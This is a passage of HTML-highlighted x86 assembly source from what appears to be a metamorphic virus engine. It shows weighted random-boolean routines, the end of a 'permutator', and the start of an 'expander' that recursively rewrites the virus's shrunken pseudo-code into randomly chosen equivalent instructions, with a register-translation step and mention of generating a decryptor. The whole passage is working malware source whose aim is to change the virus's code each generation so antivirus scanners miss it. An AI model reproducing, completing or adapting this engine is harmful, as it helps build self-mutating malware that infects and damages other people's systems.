                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X004_7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckForBooleanWeight</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X004_7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RandomBoolean_X004_7</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RandomBoolean_X008_11</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X008_11</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckForBooleanWeight</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X008_11</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">             
</span><span class="sc5">RandomBoolean_X008_11</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RandomBoolean_X012_15</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X012_15</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckForBooleanWeight</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X012_15</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">             
</span><span class="sc5">RandomBoolean_X012_15</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RandomBoolean_X016_19</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X016_19</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckForBooleanWeight</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X016_19</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">             
</span><span class="sc5">RandomBoolean_X016_19</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RandomBoolean_X020_23</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X020_23</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckForBooleanWeight</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X020_23</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RandomBoolean_X020_23</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to save code above.</span><span class="sc0">
</span><span class="sc5">CheckForBooleanWeight</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; Get the sub-weight to use</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Check1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Check2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Check3</span><span class="sc0">
      </span><span class="sc5">@@Check0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000000001h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Shr00</span><span class="sc0">
      </span><span class="sc5">@@Check1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000FF00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000000100h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Shr08</span><span class="sc0">
      </span><span class="sc5">@@Check2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000FF0000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000010000h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Shr10</span><span class="sc0">
      </span><span class="sc5">@@Check3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FF000000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001000000h</span><span class="sc0">

       </span><span class="sc5">@@Shr18</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc5">@@Shr10</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc5">@@Shr08</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">      </span><span class="sc1">; Set it at the beginning of ECX</span><span class="sc0">
       </span><span class="sc5">@@Shr00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">      </span><span class="sc1">; Get a random number in range 0-255</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; If it's above/equal the weight, jump</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Above</span><span class="sc0">
      </span><span class="sc5">@@Below</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">   </span><span class="sc1">; If it has already the max value, don't</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Return0</span><span class="sc0">     </span><span class="sc1">; touch the weight</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">    </span><span class="sc1">; True-random modification (some randomness</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; in the life of viriis :)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; Make more probability to FALSE</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">    </span><span class="sc1">; Again?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Below</span><span class="sc0">
     </span><span class="sc5">@@Return0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@Above</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">    </span><span class="sc1">; If it has already the min value, don't</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Return1</span><span class="sc0">     </span><span class="sc1">; decrease the weight</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">    </span><span class="sc1">; Randomness</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return1</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; Make more probability to TRUE</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">    </span><span class="sc1">; Again?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Above</span><span class="sc0">
     </span><span class="sc5">@@Return1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckForBooleanWeight</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; End of permutator.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;; KEYWORD: Key_!Xpander</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;; ********************************************************************** ;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The expander</span><span class="sc0">
</span><span class="sc1">;; ------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; This routine expands a shrinked pseudo-asm code previously shrinked with</span><span class="sc0">
</span><span class="sc1">;; the shrinker module. It's more easy to expand here following the</span><span class="sc0">
</span><span class="sc1">;; single/pairs/triplets rules than encoding it directly in x86 asm.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The rules of expansion are exactly the opposite ones that we use for</span><span class="sc0">
</span><span class="sc1">;; compression. For example:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; MOV [Mem],Reg</span><span class="sc0">
</span><span class="sc1">;; MOV Reg2,[Mem]    ---&gt; MOV Reg2,Reg</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; but also:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; PUSH Reg</span><span class="sc0">
</span><span class="sc1">;; POP Reg2          ---&gt; MOV Reg2,Reg</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Then the expansion rule for MOV Reg2,Reg will be:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; MOV Reg2,Reg      ---&gt; MOV [Mem],Reg + MOV Reg2,[Mem]</span><span class="sc0">
</span><span class="sc1">;;                   ---&gt; PUSH Reg + POP Reg2</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; where we select randomly one of the possible expansions.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; All the expansions are performed recursively, so every instruction involved</span><span class="sc0">
</span><span class="sc1">;; in an expansion will be expanded also, until we reach a recursivity level</span><span class="sc0">
</span><span class="sc1">;; specified in the variable [SizeOfExpansion] (from X to 3).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">

</span><span class="sc5">XpandCode</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Source of expansion</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExpansionResult</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Destiny of expansion</span><span class="sc0">

    </span><span class="sc1">;; Let's get the register translation. We must have present that DeltaReg</span><span class="sc0">
    </span><span class="sc1">;; cannot be EAX, ECX or EDX (due to API calls). Due to the usage of 8</span><span class="sc0">
    </span><span class="sc1">;; bits registers, we saved the used 8 bits register while shrinking code,</span><span class="sc0">
    </span><span class="sc1">;; so we must select that register first from one of the 4 first ones.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfExpansion</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_RecurseLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the initial</span><span class="sc0">
                                                   </span><span class="sc1">; recursivity level</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreatingADecryptor</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; If we are creating</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; a decryptor, keep the</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@KeepRegisterTranslation</span><span class="sc0"> </span><span class="sc1">; current register translation</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Initialize the registers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set the ESP</span><span class="sc0">
    </span><span class="sc5">@@Other8BitsReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; Get a 8 bits register</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Other8BitsReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Register8Bits</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the saved register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetRegister4Xlation</span><span class="sc0"> </span><span class="sc1">; Set the translation</span><span class="sc0">
    </span><span class="sc5">@@OtherDeltaReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">              </span><span class="sc1">; Get a register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">; EAX, ECX or EDX?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@OtherDeltaReg</span><span class="sc0">       </span><span class="sc1">; If so, select another</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; ESP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OtherDeltaReg</span><span class="sc0">       </span><span class="sc1">; Then, select another</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetRegister4Xlation</span><span class="sc0"> </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OtherDeltaReg</span><span class="sc0">       </span><span class="sc1">; Other if it coincides with Reg8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; Set EBX = 0 at first</span><span class="sc0">
    </span><span class="sc5">@@NextRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX = DeltaRegister?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextRegister</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Register8Bits</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX = Register8Bits?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextRegister</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; ESP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextRegister</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; End of loop?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndOfRegisters</span><span class="sc0">
    </span><span class="sc5">@@OtherRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">           </span><span class="sc1">; Get a register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OtherRegister</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_SetRegister4Xlation</span><span class="sc0"> </span><span class="sc1">; Try to set the register</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OtherRegister</span><span class="sc0">    </span><span class="sc1">; If it's set in another one, select</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextRegister</span><span class="sc0">     </span><span class="sc1">; another</span><span class="sc0">
    </span><span class="sc5">@@EndOfRegisters</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the Delta Register</span><span class="sc0">
